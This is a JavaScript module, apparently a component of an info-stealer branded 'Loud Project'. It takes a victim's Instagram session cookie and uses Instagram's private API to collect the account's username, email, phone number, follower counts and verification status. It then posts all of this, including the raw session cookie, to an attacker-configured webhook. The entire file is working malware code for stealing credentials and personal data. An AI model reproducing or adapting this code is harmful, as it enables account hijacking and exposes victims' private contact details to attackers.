const axios = require("axios");
const { wbk } = require("../../data/Config");

async function instaData(cookie) {
  const data = {};
  const headers = {
    Host: "i.instagram.com",
    "X-Ig-Connection-Type": "WiFi",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Ig-Capabilities": "36r/Fx8=",
    "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
    "X-Ig-App-Locale": "en",
    "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
    "Accept-Encoding": "gzip, deflate",
    Cookie: `sessionid=${cookie};`,
  };

  const response = await axios
    .get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers })
    .then((response) => response.data)
    .catch(() => null);

  if (response && response.user) {
    data["username"] = response.user.username;
    data["verified"] = response.user.is_verified;
    data["avatar"] = response.user.profile_pic_url;
    data["sessionid"] = cookie;
    data["id"] = response.user.pk_id;
    data["number"] = response.user.phone_number;
    data["mail"] = response.user.email;
    data["name"] = response.user.full_name;
    data["bio"] = response.user.biography;
  }

  const response2 = await axios
    .get(`https://i.instagram.com/api/v1/users/${data["id"]}/info`, { headers: headers })
    .then((response) => response.data)
    .catch(() => null);
  if (response2 && response2.user) {
    data["followers"] = response2.user.follower_count;
    data["follows"] = response2.user.following_count;
  }

  return data;
}

async function Send(cookie) {
  const data = await instaData(cookie);

  axios
    .post(wbk, {
      avatar_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
      username: "Loud Project",
      embeds: [
        {
          color: 3092790,
          fields: [
            {
              name: "Username",
              value: `\`${data.username || "None"}\``,
              inline: true,
            },
            {
              name: "Name",
              value: `\`${data.name || "None"}\``,
              inline: true,
            },
            {
              name: "Email",
              value: `\`${data.mail || "None"}\``,
              inline: true,
            },
            {
              name: "Phone Number",
              value: `\`${data.number || "None"}\``,
              inline: true,
            },
            {
              name: "Follower Count",
              value: `\`${data.followers || 0}\``,
              inline: true,
            },
            {
              name: "Follows Count",
              value: `\`${data.follows || 0}\``,
              inline: true,
            },
            {
              name: "Verifed",
              value: `\`${data.verified ? "✅" : "❌"}\``,
              inline: true,
            },
            {
              name: "Cookie",
              value: `\`\`\`${cookie || "Not found"}\`\`\``,
            },
          ],
          author: {
            name: "Instagram Account",
            icon_url: "https://raw.githubusercontent.com/wompless/tarantula-operator/refs/heads/main/LoudProject.png",
          },
          footer: {
            text: "Loud Project | https://t.me/LoudProject",
          },
          thumbnail: {
            url: data.avatar,
          },
        },
      ],
    })
    .catch(() => null);
}
module.exports = { Send };
